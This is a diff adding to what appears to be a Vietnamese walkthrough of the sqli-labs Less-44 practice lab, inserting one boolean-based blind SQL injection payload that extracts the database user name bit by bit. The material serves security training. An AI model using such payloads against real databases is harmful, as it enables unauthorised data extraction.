@@ -28,4 +28,8 @@ Create 1 user mới
 
 Ta có thể khai thác dữ liệu trong DB bằng cách sử dụng boolean based
 
+```
+1' or (ascii((substr(user(),1,1))) >> 6)=1 -- 
+```
+
 ![](../images/sqli-labs/Less-44/09.png)
